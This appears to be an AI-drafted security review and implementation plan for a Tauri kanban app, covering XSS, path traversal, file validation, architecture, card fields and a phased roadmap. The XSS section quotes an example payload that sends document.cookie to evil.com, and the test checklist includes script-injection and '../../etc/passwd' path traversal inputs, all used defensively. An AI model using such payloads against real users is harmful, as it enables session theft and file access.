# Chronica v0.1.0-alpha - Improvement Plan & Security Analysis

**Generated:** 2025-10-25
**Target:** Always-on kanban app with Card Fields support

---

## Executive Summary

Analyzed Tauri-based kanban application. Found 28 issues across security, architecture, code quality, and performance. Prioritized into 4-phase implementation plan (9 weeks). Critical security fixes required before production use.

**Primary Goals:**

- Eliminate XSS and file security vulnerabilities
- Support custom card fields with validation
- Enable Windows autostart + always-on behavior
- Responsive UI (columns resize to stay 100% visible)
- Move import/export to sidebar for better UX
- Verify/improve existing drag-and-drop functionality
- Achieve production-ready quality

---

## Security Issues (CRITICAL)

### 1. XSS Vulnerability - No Input Sanitization

**Severity:** CRITICAL
**Location:** `src/ui/CardEditor.tsx:81-97`, likely `src/ui/Card.tsx`

**Issue:**
User input (card titles, descriptions) rendered without sanitization. Attackers could inject:

```html
<img src="x" onerror="fetch('evil.com?data='+document.cookie)" />
```

**Fix:**

- Install DOMPurify: `pnpm add dompurify @types/dompurify`
- Sanitize all user content before render
- Or use text nodes only (safer)

---

### 2. File Import Size Validation Missing

**Severity:** CRITICAL
**Location:** `src/io/schema.ts:59-63`, `src/io/importExport.ts:121`

**Issue:**
`MAX_FILE_SIZE` defined but never enforced. Can import unlimited size files, causing:

- Memory exhaustion
- DoS attacks
- Browser crashes

**Fix:**

```typescript
// Before readTextFile in importExport.ts:121
const fileHandle = await open({...});
const stats = await stat(fileHandle);
if (stats.size > VALIDATION_LIMITS.MAX_FILE_SIZE) {
  throw new Error(`File too large (max 2MB)`);
}
```

---

### 3. Temp File Cleanup Missing

**Severity:** HIGH
**Location:** `src/io/persistence.ts:91-92`

**Issue:**
Creates `.tmp` files for atomic writes but never deletes them. Disk fills over time.

**Fix:**

```typescript
// Option 1: Cleanup in finally
try {
  await writeTextFile(tempPath, content);
  await writeTextFile(path, content);
} finally {
  if (await exists(tempPath)) await remove(tempPath);
}

// Option 2: Implement atomic rename in Rust backend (better)
```

---

### 4. Unsafe JSON Parsing

**Severity:** HIGH
**Location:** `src/io/persistence.ts:43,163`

**Issue:**
`JSON.parse()` without validation. Corrupted files cause crashes or security issues.

**Fix:**
Replace all instances with Zod validation:

```typescript
const content = await readTextFile(path);
const parsed = JSON.parse(content);
const validated = ConfigSchema.parse(parsed); // Throws on invalid
```

---

### 5. Path Traversal Risk

**Severity:** MEDIUM
**Location:** `src/platform/paths.ts:32-34`

**Issue:**
`boardId` directly in filename without validation. Attacker could pass `../../etc/passwd`.

**Fix:**

```typescript
const UUID_REGEX = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

export async function getBoardPath(boardId: string): Promise<string> {
  if (!UUID_REGEX.test(boardId)) {
    throw new Error("Invalid board ID format");
  }
  const boardsDir = await getBoardsDir();
  return await join(boardsDir, `board-${boardId}.json`);
}
```

---

## Best Practices Issues (HIGH)

### 6. No Error Boundaries

**Location:** `src/main.tsx:5-9`

**Issue:**
React crashes expose full stack traces to users. No graceful degradation.

**Fix:**

```typescript
// Create ErrorBoundary component
class ErrorBoundary extends React.Component {
  state = { hasError: false };
  static getDerivedStateFromError() { return { hasError: true }; }
  componentDidCatch(error, info) { logger.error(error, info); }
  render() {
    if (this.state.hasError) return <ErrorFallback />;
    return this.props.children;
  }
}

// Wrap in main.tsx
<ErrorBoundary><App /></ErrorBoundary>
```

---

### 7. Alert/Confirm Usage

**Location:** `src/App.tsx:94,127`, `src/ui/CardEditor.tsx:30,56`

**Issue:**
Native browser dialogs are:

- Blocking (prevents async operations)
- Unstyled (breaks UI consistency)
- Inaccessible (no keyboard nav)

**Fix:**
Create reusable `ui/Dialog.tsx` modal component with confirm/cancel variants.

---

### 8. Production Logging

**Location:** `src/App.tsx:44-93` (15+ console.log statements)

**Issue:**
Console logs expose internal state in production. Performance impact.

**Fix:**

```typescript
// services/logger.ts
const logger = {
  debug: import.meta.env.DEV ? console.log : () => {},
  info: console.info,
  warn: console.warn,
  error: console.error,
};
export default logger;
```

---

### 9. Missing Loading States

**Location:** `src/ui/KanbanBoard.tsx`, `src/io/importExport.ts`

**Issue:**
No visual feedback during:

- Import operations (can take seconds for large files)
- Drag operations (async rank calculations)
- Board switching

**Fix:**
Add loading spinners, progress bars, skeleton screens.

---

### 10. Type Safety Gaps

**Location:** `src/platform/window.ts:18-19`, `src/vite.config.ts:4`

**Issue:**
`@ts-expect-error` suppresses type checking. Hides bugs.

**Fix:**

```typescript
// window.ts - Proper type declaration
declare module "@tauri-apps/api/window" {
  interface Window {
    setOpacity(opacity: number): Promise<void>;
  }
}
```

---

## Architecture Issues (MEDIUM)

### 11. Tight Coupling

**Issue:**
Components directly import Tauri APIs. Hard to:

- Test (can't mock Tauri functions)
- Port to web version
- Swap implementations

**Fix:**
Create abstraction layer:

```typescript
// services/storage.ts
export interface IStorageService {
  readFile(path: string): Promise<string>;
  writeFile(path: string, content: string): Promise<void>;
}

class TauriStorageService implements IStorageService {
  async readFile(path: string) {
    return await readTextFile(path);
  }
  // ...
}
```

---

### 12. Mixed Store Concerns

**Location:** `src/state/store.ts:84`

**Issue:**
Single store handles boards + config + UI state. Violates Single Responsibility Principle.

**Fix:**
Split into:

- `stores/boardStore.ts` - Board/card CRUD
- `stores/configStore.ts` - Settings, window state
- `stores/uiStore.ts` - Modal state, loading flags

---

### 13. Business Logic in UI

**Location:** `src/ui/KanbanBoard.tsx:54-88`

**Issue:**
Rank calculation (lines 78-84) in component. Hard to test, reuse.

**Fix:**
Move to store action:

```typescript
// In boardStore.ts
moveCardBetween(cardId: string, targetColumn: string, afterCardId?: string) {
  const cards = get().activeBoard.cards;
  const newRank = calculateRankBetween(cards, afterCardId);
  // ...
}
```

---

### 14. No Dependency Injection

**Issue:**
All modules use direct imports. Hard to swap implementations or mock.

**Fix:**
Use React Context for services:

```typescript
const StorageContext = createContext<IStorageService>(null);
export function useStorage() { return useContext(StorageContext); }

// In main.tsx
<StorageContext.Provider value={new TauriStorageService()}>
  <App />
</StorageContext.Provider>
```

---

### 15. Debounce Implementation Flaw

**Location:** `src/io/persistence.ts:188-207`

**Issue:**
Single global timer. Multiple rapid saves share same timeout:

```typescript
saveBoard(board1); // Sets timer
saveBoard(board2); // Clears timer, board1 never saves!
```

**Fix:**

```typescript
const timers = new Map<string, number>();

export function debouncedSave<T>(key: string, saveFn: ...) {
  if (timers.has(key)) clearTimeout(timers.get(key));
  timers.set(key, setTimeout(() => {
    saveFn(data);
    timers.delete(key);
  }, delay));
}
```

---

### 16. Magic Numbers

**Locations:**

- `src/ui/KanbanBoard.tsx:80,83` - Hardcoded `100`, `1000` for ranks
- `src/state/store.ts:25,179` - Same values

**Issue:**
Unclear intent, hard to maintain consistency.

**Fix:**

```typescript
// constants/ranks.ts
export const DEFAULT_RANK = 1000;
export const RANK_GAP = 100;
```

---

## Code Quality Issues (MEDIUM)

### 17. Missing Modularity

**Location:** `src/state/store.ts` (295 lines)

**Issue:**
Approaching 300-line limit from project rules. Single file handles all state.

**Fix:**
Split into:

- `stores/boardStore.ts` (~150 lines)
- `stores/configStore.ts` (~100 lines)
- `stores/types.ts` (interfaces)

---

### 18. Duplicate Error Handling

**Location:** Throughout `src/io/persistence.ts`

**Issue:**
Repeated try/catch patterns:

```typescript
try {
  /* operation */
} catch (error) {
  console.error("Failed to X:", error);
  throw error;
}
```

**Fix:**

```typescript
async function withErrorHandling<T>(operation: () => Promise<T>, errorMsg: string): Promise<T> {
  try {
    return await operation();
  } catch (error) {
    logger.error(errorMsg, error);
    throw new StorageError(errorMsg, error);
  }
}
```

---

### 19. Incomplete Validation

**Location:** `src/io/importExport.ts:11-27`

**Issue:**
`normalizeColor()` doesn't validate hex length. Accepts `#FFF` or `#FFFFFFF`.

**Fix:**

```typescript
function normalizeColor(color?: string): string | undefined {
  if (!color) return undefined;
  if (lowerColor in PREDEFINED_COLORS) return PREDEFINED_COLORS[lowerColor];
  if (isValidHexColor(color)) return color; // Uses /^#[0-9A-Fa-f]{6}$/
  return undefined; // Invalid - use default
}
```

---

### 20. No Type Guards

**Location:** `src/App.tsx:90-93`

**Issue:**
Type assertions instead of runtime checks:

```typescript
const error = (error as Error).message; // Assumes Error type
```

**Fix:**

```typescript
function isError(e: unknown): e is Error {
  return e instanceof Error;
}

const msg = isError(error) ? error.message : String(error);
```

---

## Performance Issues (LOW)

### 21. No Memoization

**Location:** `src/ui/CardEditor.tsx`

**Issue:**
Event handlers recreated every render. Causes unnecessary child re-renders.

**Fix:**

```typescript
const handleSave = useCallback(() => {
  if (!title.trim()) { alert("Title required"); return; }
  if (card) updateCard(card.id, {...});
  else addCard({...});
  onClose();
}, [title, description, color, column, card]);
```

---

### 22. Aggressive Debounce

**Location:** `src/io/persistence.ts:196`

**Issue:**
250ms delay too short. Typing quickly triggers many saves.

**Fix:**
Increase to 500-1000ms for better batching.

---

### 23. No Virtualization

**Location:** `src/ui/KanbanBoard.tsx`

**Issue:**
Renders all cards (up to 3000 per schema limit). Could cause lag.

**Fix:**
Use `react-window` for columns with >50 cards.

---

### 24. Full Re-renders

**Issue:**
Zustand state changes trigger entire component tree.

**Fix:**
Use selectors with shallow equality:

```typescript
const boards = useStore((state) => state.boards, shallow);
```

---

## Card Fields Design

### Architecture

**Goal:** Allow users to define additional card fields (priority, assignee, etc.) with type-safe validation.

**Storage:**

```typescript
// In Config
interface Config {
  // ... existing fields
  fields?: Record<string, FieldDefinition>; // Key is UUID
}

interface FieldDefinition {
  id: string; // UUID
  label: string; // "Priority", "Assignee" (max 50 chars)
  type: "text" | "number" | "date" | "select" | "url" | "checkbox";
  required?: boolean;
  validation?: {
    maxLength?: number; // Text (max 1000)
    pattern?: string; // Regex (validated)
    min?: number; // Number range
    max?: number;
    options?: string[]; // Select options (max 100)
  };
}

// In Card
interface Card {
  // ... existing fields
  customFields?: Record<string, unknown>; // fieldId → value
}
```

**Validation Flow:**

1. Field definitions validated on creation (Zod schema)
2. Runtime: Generate Zod schema from definitions
3. Card values validated against generated schema
4. Import: Validate field defs, then card values

**Security:**

- Regex patterns validated (prevent ReDOS)
- URL fields validated against safe protocols
- Text sanitized with DOMPurify
- Max 20 fields per board
- Max 1000 chars per text field

**UI:**

- Settings → "Card Fields" tab
- CRUD interface for field definitions
- CardEditor dynamically renders based on field types
- Inline validation errors

**Export Format:**

```json
{
  "meta": {
    "schema": "chronica-board",
    "version": 1,
    "fields": {
      "uuid-1": { "id": "uuid-1", "label": "Priority", "type": "select", ... }
    }
  },
  "columns": [...],
  "cards": [
    {
      "id": "...",
      "title": "...",
      "customFields": {
        "uuid-1": "high"
      }
    }
  ]
}
```

**Import Merging:**

- Compare imported fields with existing by label
- Prompt user: "Merge", "Replace", "Keep Both"
- Validate all card values post-merge
- Reject if validation fails

---

## Implementation Plan

### Phase 0: Critical Security (Week 1)

**Goal:** Eliminate vulnerabilities

**Tasks:**

1. Install DOMPurify, sanitize all user content renders
2. Enforce MAX_FILE_SIZE in import flow
3. Validate boardId format (UUID regex)
4. Replace JSON.parse with Zod validation
5. Implement temp file cleanup or atomic writes

**Deliverable:** No critical security issues

**Verification:**

- [ ] XSS test: Try `<script>alert(1)</script>` in card title
- [ ] File test: Import 5MB file (should reject)
- [ ] Path test: Try boardId `../../test` (should reject)

---

### Phase 1: Foundation (Week 2-3)

**Goal:** Solid architecture for extensibility + UX improvements

**Tasks:**

1. Create service layer (storage, window, logger)
2. Split Zustand stores (board, config, ui)
3. Add error boundaries to main.tsx
4. Implement Map-based debounce
5. Replace alert/confirm with Dialog component
6. Extract magic numbers to constants
7. Type guard utilities
8. **UI Refactor: Move import/export to sidebar**
   - Remove Import/Export buttons from Header (src/ui/Header.tsx:43-48)
   - Add to Sidebar footer above Settings button (src/ui/Sidebar.tsx:106)
   - Update App.tsx callbacks to work with new location
   - Maintain export disabled state when no active board
9. **Responsive kanban columns**
   - Make column widths resize dynamically with window
   - Use CSS flexbox or grid to keep all columns 100% visible
   - Prevent horizontal overflow/scrolling
   - Add min-width constraints for usability
10. **Verify/improve drag-and-drop**
    - Test existing @dnd-kit implementation (src/ui/KanbanBoard.tsx)
    - Verify cards drag smoothly between columns
    - Check rank calculation doesn't cause conflicts
    - Ensure drag preview renders correctly
    - Test edge cases (empty columns, single cards)

**Deliverable:** Testable, maintainable codebase with improved UX

**Verification:**

- [ ] Mock storage service in tests
- [ ] Crash app, see error boundary
- [ ] Save 3 boards rapidly, all persist
- [ ] Import/Export buttons in sidebar above Settings
- [ ] Resize window to small size, all columns visible
- [ ] Drag cards between all columns smoothly

---

### Phase 2: Card Fields (Week 4-5)

**Goal:** Flexible field system with validation

**Tasks:**

1. Define FieldDefinition types + Zod schema
2. Update Config interface, add fields storage
3. Create field registry with dynamic validation
4. Build FieldManager UI (Settings tab)
5. Update CardEditor to render Card Fields
6. Implement import/export for field definitions
7. Field value validation in card CRUD

**Deliverable:** Working Card Fields feature

**Verification:**

- [ ] Create "Priority" select field (high/med/low)
- [ ] Add priority to 3 cards
- [ ] Export board, verify field defs in JSON
- [ ] Import to new board, verify fields work

---

### Phase 3: Always-On Features (Week 6-7)

**Goal:** Reliable 24/7 operation

**Tasks:**

1. Windows autostart configuration
   - Tauri installer options
   - Settings toggle (registry edit via Rust)
2. System tray integration
   - Tauri tray plugin
   - Show/hide on click
   - Close to tray (not quit)
3. Data reliability
   - Save queue with retry mechanism
   - UI warning on save failure
   - Backup rotation (keep last 5)
4. Performance optimization
   - Memoize handlers (useCallback)
   - Virtualize card lists (react-window)
   - Zustand selectors
5. Window state persistence
   - Save position/size on change
   - Restore on launch
   - Multi-monitor support

**Deliverable:** Stable always-on app

**Verification:**

- [ ] Restart Windows, Chronica auto-launches
- [ ] Close window, app stays in tray
- [ ] Kill process mid-save, data recovers

---

### Phase 4: Polish (Week 8-9)

**Goal:** Production-ready

**Tasks:**

1. Testing setup
   - Install Vitest + React Testing Library
   - Store tests (80% coverage)
   - Import/export integration tests
   - E2E drag-drop tests
2. Loading states (spinners, progress bars)
3. Enhanced error handling (structured errors)
4. Accessibility (keyboard nav, ARIA)
5. Migration system (version upgrades)
6. Remove production logs
7. Documentation (README, security guide, ADRs)

**Deliverable:** Production-ready v0.1.0-alpha

**Verification:**

- [ ] 80%+ test coverage
- [ ] No console.log in production build
- [ ] WCAG 2.1 AA compliant
- [ ] Migrate v0 data to v1 successfully

---

## Unresolved Questions

**Card Fields:**

- [ ] Max number of Card Fields? (suggest 20)
- [ ] Allow field reordering in UI?
- [ ] Field-level permissions (hide/readonly)?
- [ ] Export with/without custom data option?
- [ ] Preset templates (priority, assignee)?
- [ ] Rich text for descriptions or plain only?
- [ ] Fields per-board or global?

**Always-On:**

- [ ] Target platforms? (Windows only or cross-platform?)
- [ ] Max file size for imports? (currently 2MB)
- [ ] Backup retention policy? (suggest last 5)
- [ ] Update mechanism for auto-launched app?

**Performance:**

- [ ] Expected max cards per board? (schema says 3000)
- [ ] Expected max boards? (schema says 20)
- [ ] Acceptable save delay? (suggest 500-1000ms)

**Accessibility:**

- [ ] Screen reader support required?
- [ ] High contrast mode?
- [ ] Keyboard-only navigation?

**Features:**

- [ ] Undo/redo support needed?
- [ ] Multi-language support?
- [ ] Dark mode?
- [ ] Collaboration features (future)?

---

## File Structure Changes

**Proposed structure after refactor:**

```
src/
├── constants/
│   ├── ranks.ts          # DEFAULT_RANK, RANK_GAP
│   └── validation.ts     # MAX_FILE_SIZE, MAX_CARDS
├── services/
│   ├── storage.ts        # IStorageService, TauriStorage
│   ├── window.ts         # IWindowService, TauriWindow
│   └── logger.ts         # Environment-aware logger
├── stores/
│   ├── boardStore.ts     # Board/card state
│   ├── configStore.ts    # Settings state
│   └── uiStore.ts        # Modal/loading state
├── io/
│   ├── fieldSchema.ts    # Field validation (NEW)
│   ├── fieldRegistry.ts  # Dynamic Zod schemas (NEW)
│   └── [existing files]
├── ui/
│   ├── Dialog.tsx        # Reusable modal (NEW)
│   ├── FieldManager.tsx  # Field CRUD UI (NEW)
│   ├── ErrorBoundary.tsx # Error handling (NEW)
│   └── [existing files]
└── utils/
    ├── errorHandler.ts   # Structured errors (NEW)
    └── typeGuards.ts     # Runtime checks (NEW)
```

---

## Success Metrics

**Security:**

- [ ] Zero XSS vulnerabilities (validated by penetration test)
- [ ] All file operations validated (MAX_FILE_SIZE enforced)
- [ ] No path traversal possible

**Reliability:**

- [ ] 99.9% save success rate (with retry)
- [ ] Zero data loss on crashes (backup system)
- [ ] Auto-recovery from corrupted files

**Performance:**

- [ ] <100ms UI response on drag operations
- [ ] <2s load time for 1000-card boards
- [ ] <50MB memory footprint

**Quality:**

- [ ] 80%+ test coverage
- [ ] Zero production console.logs
- [ ] All files <300 lines

**UX:**

- [ ] Always-on (launches with Windows)
- [ ] Accessible (WCAG 2.1 AA)
- [ ] Card Fields working
- [ ] Import/Export in sidebar above Settings
- [ ] Responsive columns (100% visible at all window sizes)
- [ ] Smooth drag-and-drop between columns

---

## Next Steps

1. **Answer unresolved questions** (above)
2. **Start Phase 0** (critical security fixes)
3. **Setup project tracking** (GitHub issues/project board)
4. **Create test plan** (security + functional)

Ready to begin implementation on your signal.
